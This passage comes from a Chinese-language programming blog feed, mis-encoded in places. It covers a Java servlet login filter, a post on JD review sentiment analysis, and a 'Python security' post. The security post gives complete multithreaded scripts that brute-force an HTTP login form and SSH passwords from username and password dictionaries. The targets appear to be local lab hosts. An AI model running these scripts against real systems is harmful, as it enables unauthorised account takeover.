title="æƒé™éªŒè¯"></a>æƒé™éªŒè¯</h3><p>ä½¿ç”¨javawebçš„ä¸‰å¤§ç»„ä»¶ <code>filer</code>å®ç°</p><p>åœ¨<code>src/main/java/com/itheima/servler/web/filter</code>ä¸­åˆ›å»º<code>LoginFilter</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.web.filter;<span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-comment">//@WebFilter(&quot;/*&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        <span class="hljs-comment">// æ”¾è¡Œç™»å½•ç›¸å…³çš„èµ„æº</span>        String urls[] = &#123;<span class="hljs-string">&quot;/login.jsp&quot;</span>, <span class="hljs-string">&quot;/css/&quot;</span>, <span class="hljs-string">&quot;/imgs/&quot;</span>, <span class="hljs-string">&quot;register.jsp&quot;</span>,<span class="hljs-string">&quot;/checkCode&quot;</span>,<span class="hljs-string">&quot;/register&quot;</span>,<span class="hljs-string">&quot;/login&quot;</span>&#125;;        HttpServletRequest req = (HttpServletRequest) request;        StringBuffer requestURL = req.getRequestURL();        String url = requestURL.toString();        <span class="hljs-keyword">for</span>(String u :urls )&#123;            <span class="hljs-keyword">if</span>(url.contains(u))&#123;                chain.doFilter(request,response);                <span class="hljs-keyword">return</span> ;            &#125;        &#125;        HttpSession session = req.getSession();        Object user = session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);        <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;            chain.doFilter(request, response);        &#125;<span class="hljs-keyword">else</span> &#123;            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>, <span class="hljs-string">&quot;æ‚¨å°šæœªç™»å½•ï¼&quot;</span>);            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(req, response);        &#125;    &#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mybatis</tag>
      
      <tag>servlet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonå®‰å…¨æ”»é˜²</title>
    <link href="/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    <url>/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="å¤šçº¿ç¨‹çˆ†ç ´è´¦å·å¯†ç "><a href="#å¤šçº¿ç¨‹çˆ†ç ´è´¦å·å¯†ç " class="headerlink" title="å¤šçº¿ç¨‹çˆ†ç ´è´¦å·å¯†ç "></a>å¤šçº¿ç¨‹çˆ†ç ´è´¦å·å¯†ç </h1><p>æ–‡ä»¶ç›®å½•</p><blockquote><p>passwordsï¼šå¯†ç å­—å…¸ </p><p>username:   è´¦å·å­—å…¸</p><p>result: ä¿å­˜ç»“æœ</p><p>WeakPass.py :ç ´è§£ç¨‹åº</p></blockquote><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-comment"># å¯¹å­—å…¸çš„åˆ†å—å¤§å°</span>BLOCK_SIZE = <span class="hljs-number">1000</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>:</span>    url = <span class="hljs-string">&quot;http://127.0.0.1/homework/brute/login.php&quot;</span>    headers = &#123;            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 &#x27;</span>            <span class="hljs-string">&#x27;(KHTML, like Gecko) &#x27;</span>            <span class="hljs-string">&#x27;Chrome/19.0.1036.7 Safari/535.20&#x27;</span>    &#125;    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, username, password</span>):</span>        self.username = username        self.password = password    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>        data = &#123;            <span class="hljs-string">&#x27;username&#x27;</span>:username,            <span class="hljs-string">&#x27;password&#x27;</span>:password,            <span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>        &#125;        print(<span class="hljs-string">&quot;username:&#123;&#125;,password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username,password))        response = requests.post(self.url, data=data, headers=self.headers)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Login failed&#x27;</span> <span class="hljs-keyword">in</span> response.text:            <span class="hljs-keyword">pass</span>        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))            resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)            resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))            resultFile.close()            <span class="hljs-comment"># ç¨‹åºç»ˆæ­¢ï¼Œ0è¡¨ç¤ºæ­£å¸¸é€€å‡º</span>            <span class="hljs-comment"># os._exit(0) </span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.username:            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.password:                self.run(userItem, pwdItem)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BruteForceHttp</span>():</span>    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]    <span class="hljs-comment"># å¯¹å¯†ç å’Œç”¨æˆ·åè¿›è¡Œåˆ†å—å¤„ç†</span>    blockUsername = partition(listUsername, BLOCK_SIZE)    blockPassword = partition(listPassword, BLOCK_SIZE)    threads = []    <span class="hljs-comment"># å°†ä¸åŒçš„å¯†ç å­å—åˆ†ç»™ä¸åŒçš„çº¿ç¨‹çˆ†ç ´</span>    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:            work = ThreadWork(sonUserBlock, sonPwdBlock)            workThread = threading.Thread(target=work.start)            threads.append(workThread)    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:        t.start()    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:        t.join()<span class="hljs-comment"># å°†å¯†ç å’Œè´¦å·åˆ†å—å‡½æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params">ls, size</span>):</span>    res = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ls), size):        res.append(ls[i: i+size])    <span class="hljs-keyword">return</span> res<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    time1 = time.time()    BruteForceHttp()    time2 = time.time()    print(time2-time1)</code></pre><p>ä¸ƒåä¸‡æ¡çš„æ•°æ®è·‘äº†å¿«ååˆ†é’Ÿï¼Œæœ‰ç‚¹ä¸å¯æ€è®®ã€‚ã€‚ã€‚å¯èƒ½æ˜¯æœåŠ¡å™¨çš„é—®é¢˜</p><h1 id="å¤šçº¿ç¨‹ç ´è§£SSHå¯†ç "><a href="#å¤šçº¿ç¨‹ç ´è§£SSHå¯†ç " class="headerlink" title="å¤šçº¿ç¨‹ç ´è§£SSHå¯†ç "></a>å¤šçº¿ç¨‹ç ´è§£SSHå¯†ç </h1><blockquote><p>passwordsï¼šå¯†ç å­—å…¸ </p><p>username:   è´¦å·å­—å…¸</p><p>result: ä¿å­˜ç»“æœ</p><p>SSHattack:è¿æ¥æ—¥å¿—</p><p>brute_SSH.py: ç ´è§£ç¨‹åº</p></blockquote><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-keyword">import</span> optparse<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> paramiko<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>(<span class="hljs-params">threading.Thread</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, ip, usernameBlock, passwordBlock, port</span>):</span>        threading.Thread.__init__(self)        self.ip = ip        self.port = port        self.usernameBlock = usernameBlock        self.passwordBlock = passwordBlock    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">        ä½¿ç”¨æ­»å¾ªç¯</span><span class="hljs-string">        &#x27;&#x27;&#x27;</span>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            <span class="hljs-keyword">try</span>:                paramiko.util.log_to_file(<span class="hljs-string">&quot;SSHattack.log&quot;</span>)                ssh = paramiko.SSHClient()                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())                sys.stdout.write(<span class="hljs-string">&quot;[*]ssh[&#123;&#125;:&#123;&#125;:&#123;&#125; =&gt; &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(username,password,self.port, self.ip))                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password)                ssh.close()                print(<span class="hljs-string">&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username , password))                resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../brutpass/result&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>)                resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))                resultFile.close()                os._exit(<span class="hljs-number">0</span>)            <span class="hljs-keyword">except</span> paramiko.ssh_exception.AuthenticationException <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">break</span>            <span class="hljs-keyword">except</span> paramiko.ssh_exception.SSHException <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">break</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.usernameBlock:            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.passwordBlock:                self.run(userItem, pwdItem)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, num</span>):</span>    step = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>) / num)    <span class="hljs-keyword">if</span> step == <span class="hljs-number">0</span>:        step = num    partition = [<span class="hljs-built_in">list</span>[i:i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>), step)]    <span class="hljs-keyword">return</span> partition<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SshEXP</span>(<span class="hljs-params">ip, usernameFile, passwordFile, threadNumber, sshPort</span>):</span>    print(<span class="hljs-string">&quot;============çˆ†ç ´ä¿¡æ¯============&quot;</span>)    print(<span class="hljs-string">&quot;IP:&quot;</span> + ip)    print(<span class="hljs-string">&quot;UserName:&quot;</span> + usernameFile)    print(<span class="hljs-string">&quot;PassWord:&quot;</span> + passwordFile)    print(<span class="hljs-string">&quot;Threads:&quot;</span> + <span class="hljs-built_in">str</span>(threadNumber))    print(<span class="hljs-string">&quot;Port:&quot;</span> + sshPort)    print(<span class="hljs-string">&quot;=================================&quot;</span>)    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/username&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/passwords&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]    <span class="hljs-comment"># è¯»å–è´¦å·æ–‡ä»¶å’Œå¯†ç æ–‡ä»¶å¹¶å­˜å…¥å¯¹åº”åˆ—è¡¨</span>    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(usernameFile)]    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(passwordFile)]    <span class="hljs-comment"># è´¦å·åˆ—è¡¨å’Œå¯†ç åˆ—è¡¨æ ¹æ®çº¿ç¨‹æ•°é‡è¿›è¡Œåˆ†å—</span>    blockUsername = partition(listUsername, threadNumber)    blockPassword = partition(listPassword, threadNumber)    threads = []    <span class="hljs-comment"># æ¯ä¸ªçº¿ç¨‹åˆ†é…ä¸€ä¸ªè´¦å·å¯†ç å­å—</span>    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:            work = ThreadWork(ip, sonUserBlock, sonPwdBlock, sshPort)            <span class="hljs-comment"># åˆ›å»ºçº¿ç¨‹</span>            workThread = threading.Thread(target=work.start)            <span class="hljs-comment"># åœ¨threadsä¸­åŠ å…¥çº¿ç¨‹</span>            threads.append(workThread)    <span class="hljs-comment"># å¼€å§‹å­çº¿ç¨‹</span>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:        t.start()    <span class="hljs-comment"># é˜»å¡ä¸»çº¿ç¨‹ï¼Œç­‰å¾…æ‰€æœ‰å­çº¿ç¨‹å®Œæˆå·¥ä½œ</span>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:        t.join()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    parser = optparse.OptionParser(<span class="hljs-string">&#x27;usage: python %prog target [options] \n\n&#x27;</span>                                   <span class="hljs-string">&#x27;Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n&#x27;</span>)    <span class="hljs-comment"># æ·»åŠ ç›®æ ‡ä¸»æœºå‚æ•°-i</span>    parser.add_option(<span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--ip&#x27;</span>, dest=<span class="hljs-string">&#x27;IP&#x27;</span>,                      default=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target IP&#x27;</span>)    <span class="hljs-comment"># æ·»åŠ çº¿ç¨‹å‚æ•°-t</span>    parser.add_option(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--threads&#x27;</span>, dest=<span class="hljs-string">&#x27;threadNum&#x27;</span>,                      default=<span class="hljs-number">10</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>,                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Number of threads [default = 10]&#x27;</span>)    <span class="hljs-comment"># æ·»åŠ ç”¨æˆ·åæ–‡ä»¶å‚æ•°-u</span>    parser.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--username&#x27;</span>, dest=<span class="hljs-string">&#x27;userName&#x27;</span>,                      default=<span class="hljs-string">&#x27;./username&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;username file&#x27;</span>)    <span class="hljs-comment"># æ·»åŠ å¯†ç æ–‡ä»¶å‚æ•°-p</span>    parser.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--password&#x27;</span>, dest=<span class="hljs-string">&#x27;passWord&#x27;</span>,                      default=<span class="hljs-string">&#x27;./password&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;password file&#x27;</span>)    <span class="hljs-comment"># æ·»åŠ SSHç«¯å£å‚æ•°-P</span>    parser.add_option(<span class="hljs-string">&#x27;-P&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, dest=<span class="hljs-string">&#x27;port&#x27;</span>,                      default=<span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;ssh port&#x27;</span>)    (options, args) = parser.parse_args()    SshEXP(options.IP, options.userName, options.passWord, options.threadNum, options.port)</code></pre><p>ä½¿ç”¨æ–¹æ³•</p><pre><code class="hljs stylus">python brute_SSH<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">164.166</span> -u ./username -<span class="hljs-selector-tag">p</span> ./passwords</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825163939574.png" alt="image-20210825163939574" style="zoom:80%;">]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å•†å“è¯„ä»·æƒ…æ„Ÿåˆ†æ</title>
    <link href="/2021/08/06/maliciousUrls/"/>
    <url>/2021/08/06/maliciousUrls/</url>
    
    <content type="html"><![CDATA[<h1 id="é¡¹ç›®ç»¼è¿°"><a href="#é¡¹ç›®ç»¼è¿°" class="headerlink" title="é¡¹ç›®ç»¼è¿°"></a>é¡¹ç›®ç»¼è¿°</h1><ul><li><p>å¯¹ç»™å®šçš„æ–‡æœ¬è¿›è¡Œè‡ªåŠ¨åˆ†ç±»ï¼Œå¯¹è¯„ä»·åˆ†æˆå¥½è¯„å’Œå·®è¯„</p></li><li><p>æ”¯æŒæ‰¹é‡æ£€æµ‹ï¼Œå¹¶è¿›è¡Œå¯è§†åŒ–å±•ç¤º</p></li><li><p>å¯¹æ‰€æœ‰è¯„ä»·è¿›è¡Œè¯äº‘å±•ç¤º</p></li></ul><h1 id="æ•°æ®è·å–"><a href="#æ•°æ®è·å–" class="headerlink" title="æ•°æ®è·å–"></a>æ•°æ®è·å–</h1><p>çˆ¬è™«è·å–JDçš„å•†å“è¯„ä»·ï¼Œè¿™é‡Œä¸»è¦é’ˆå¯¹æ™ºèƒ½æ‰‹æœºçš„è¯„ä»·</p><ul><li><p>é¦–å…ˆæ˜¯åˆ†æå¦‚ä½•è·å–åˆ°å•†å“çš„è¯„ä»·</p></li><li><p>å¯¹å•†å“è¯„ä»·è¿›è¡Œæå–</p></li><li><p>å¯¹è·å–çš„æ•°æ®è¿›è¡Œåˆ†ç±»ä¿å­˜</p></li></ul><h2 id="è·å–è¯„ä»·"><a href="#è·å–è¯„ä»·" class="headerlink" title="è·å–è¯„ä»·"></a>è·å–è¯„ä»·</h2><p>é¦–å…ˆè¿›è¡Œæœç´¢ï¼Œæ¯”å¦‚å…³é”®è¯ ä¸ºæ‰‹æœº</p><pre><code class="hljs ini"><span class="hljs-attr">self.startUrl</span> = <span class="hljs-string">&quot;https://search.jd.com/Search?keyword=%s&amp;enc=utf-8&quot;</span> % (quote(<span class="hljs-string">&#x27;æ‰‹æœº&#x27;</span>))  <span class="hljs-comment"># jDèµ·å§‹æœç´¢é¡µé¢</span></code></pre><p>ä¹‹åè·å–å•†å“çš„IDï¼Œå¯ä»¥åœ¨ç½‘é¡µæºç ä¸­æå–<code>//li[@class=&quot;gl-item&quot;]/@data-sku</code>ï¼Œå…·ä½“çš„èŠ‚ç‚¹ä¿¡æ¯å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164810298.png" alt="image-20210807164810298"></p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164417239.png" alt="image-20210807164417239" style="zoom:80%;"><p>è·å¾—å•†å“IDåå¯ä»¥åˆ©ç”¨JDæä¾›çš„è¯„ä»·APIè·å–è¯„è®ºé¡µé¢ï¼Œå¦‚å›¾</p><p>apiæ¥å£å¦‚ä¸‹</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://sclub.jd.com/comment/productPageComments.action?productId=<span class="hljs-number">100020210392</span>&amp;score=<span class="hljs-number">3</span>&amp;sortType=<span class="hljs-number">5</span>&amp;page=<span class="hljs-number">2</span>&amp;pageSize=<span class="hljs-number">10</span>&amp;isShadowSku=<span class="hljs-number">0</span>&amp;rid=<span class="hljs-number">0</span>&amp;fold=<span class="hljs-number">1</span></code></pre><p>å…¶ä¸­éœ€è¦æ”¹å˜çš„å‚æ•°ä¸º</p><ul><li><p>productId  å•†å“ID</p></li><li><p>score è¯„è®ºçš„åˆ†ç±» 1ä¸ºå·®è¯„ 2ä¸ºä¸­è¯„ 3ä¸ºå¥½è¯„</p></li><li><p>page è¯„è®ºçš„é¡µæ•°</p></li></ul><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164923145.png" alt="image-20210807164923145" style="zoom:80%;"><p>è·å–è¿™ä¸ªé¡µé¢åå°±æ˜¯å¯¹æ•°æ®è¿›è¡Œæå–</p><h2 id="æ•°æ®æå–"><a href="#æ•°æ®æå–" class="headerlink" title="æ•°æ®æå–"></a>æ•°æ®æå–</h2><blockquote><p> è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œå…ˆå°†æå–åˆ°çš„æ•°æ®ä¿å­˜åœ¨csvæ–‡ä»¶ä¸­ï¼Œä¹‹åå†å†™å…¥åˆ°æ•°æ®åº“ä¸­</p></blockquote><p>ä¸Šå›¾ä¸­æˆ‘ä»¬éœ€è¦æå–çš„æ•°æ®åªæœ‰è¯„ä»·éƒ¨åˆ†çš„å†…å®¹å’Œæ‰“åˆ†æ•°ï¼Œä¹Ÿå°±æ˜¯ï¼Œcontentå’Œsocoreçš„æ•°æ®</p><p>è¿™é‡Œå¯ä»¥å°†ç½‘é¡µæ•°æ®è½¬æ¢æˆjsonæ•°æ®åæå–ï¼Œå¾ˆæ–¹ä¾¿</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807165659199.png" alt="image-20210807165659199" style="zoom:80%;"><pre><code class="hljs python">res_json = json.loads(response.text)<span class="hljs-keyword">for</span> cdit <span class="hljs-keyword">in</span> res_json[<span class="hljs-string">&#x27;comments&#x27;</span>]:<span class="hljs-comment"># comment = cdit[&#x27;content &#x27;].replace(&quot;\n&quot;, &#x27; &#x27;)</span>comment = cdit[<span class="hljs-string">&#x27;content&#x27;</span>].replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&#x27; &#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)comments.append(comment)scores.append(cdit[<span class="hljs-string">&#x27;score&#x27;</span>])print(comment)</code></pre><h2 id="æ•°æ®ä¿å­˜"><a href="#æ•°æ®ä¿å­˜" class="headerlink" title="æ•°æ®ä¿å­˜"></a>æ•°æ®ä¿å­˜</h2><pre><code class="hljs python">savepath = <span class="hljs-string">&#x27;./&#x27;</span> + self.categlory + <span class="hljs-string">&#x27;_&#x27;</span> + self.comtype[score] + <span class="hljs-string">&#x27;.csv&#x27;</span>logging.warning(<span class="hljs-string">&quot;å·²çˆ¬å–%d æ¡ %s è¯„ä»·ä¿¡æ¯&quot;</span> % (<span class="hljs-built_in">len</span>(comments), self.comtype[score]))<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(savepath, <span class="hljs-string">&#x27;a+&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(comments)):    f.write(<span class="hljs-string">&quot;%d\t%s\t%s\n&quot;</span> % (i, scores[i], comments[i]))logging.warning(<span class="hljs-string">&quot;æ•°æ®å·²ä¿å­˜åœ¨ %s&quot;</span> % (savepath))</code></pre><h1 id="è´å¶æ–¯åˆ†ç±»"><a href="#è´å¶æ–¯åˆ†ç±»" class="headerlink" title="è´å¶æ–¯åˆ†ç±»"></a>è´å¶æ–¯åˆ†ç±»</h1><blockquote><p>1.åŠ è½½è¯­æ–™ï¼Œæ‰“ä¹±è¯­æ–™é¡ºåºï¼Œå°†è¯­æ–™åˆ†ä¸ºè¯„è®ºå’Œå¥½è¯„/å·®è¯„<br>2.å»é™¤è¯„è®ºä¸­çš„è‹±æ–‡ã€åœç”¨è¯<br>3.å°†å…¨éƒ¨è¯­æ–™æŒ‰1:4åˆ†ä¸ºæµ‹è¯•é›†ä¸è®­ç»ƒé›†<br>4.ä½¿ç”¨CountVectorizeæ„é€ è¯è¢‹æ¨¡å‹<br>5.ä½¿ç”¨TfidfTransformerè®¡ç®—tf-idfå€¼ä½œä¸ºç‰¹å¾                                                                                                                                                6.é€‰æ‹©å¤šä¸ªåˆ†ç±»å™¨è¿›è¡Œåˆ†ç±»(ä¹Ÿå¯ä»¥åªç”¨ä¸€ä¸ªï¼Œè¿™é‡Œåªç”¨äº†å¤šé¡¹å¼)<br>7.é€‰æ‹©åˆé€‚çš„æ¨¡å‹å¹¶ä¿å­˜</p></blockquote><h2 id="åŠ è½½è¯­æ–™"><a href="#åŠ è½½è¯­æ–™" class="headerlink" title="åŠ è½½è¯­æ–™"></a>åŠ è½½è¯­æ–™</h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_corpus</span>(<span class="hljs-params">file_path_pos,file_path_nag</span>):</span>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path_pos, <span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:        reader = csv.reader(f)        rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path_nag, <span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:        reader = csv.reader(f)        rows_2 = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]    rows.extend(rows_2)    <span class="hljs-comment"># å°†è¯»å–å‡ºæ¥çš„è¯­æ–™è½¬ä¸ºlist</span>    review_data = np.array(rows).tolist()    <span class="hljs-comment"># æ‰“ä¹±è¯­æ–™çš„é¡ºåº</span>    random.shuffle(review_data)    review_list = []    sentiment_list = []    <span class="hljs-comment"># ç¬¬ä¸€åˆ—ä¸ºå·®è¯„/å¥½è¯„ï¼Œ ç¬¬äºŒåˆ—ä¸ºè¯„è®º</span>    <span class="hljs-keyword">for</span> words <span class="hljs-keyword">in</span> review_data:        review_list.append(words[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\t&quot;</span>)[<span class="hljs-number">2</span>])        <span class="hljs-keyword">if</span>(words[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\t&quot;</span>)[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;5&#x27;</span>):            sentiment_list.append(<span class="hljs-number">1</span>)        <span class="hljs-keyword">else</span>:            sentiment_list.append(<span class="hljs-number">0</span>)    <span class="hljs-keyword">return</span> review_list, 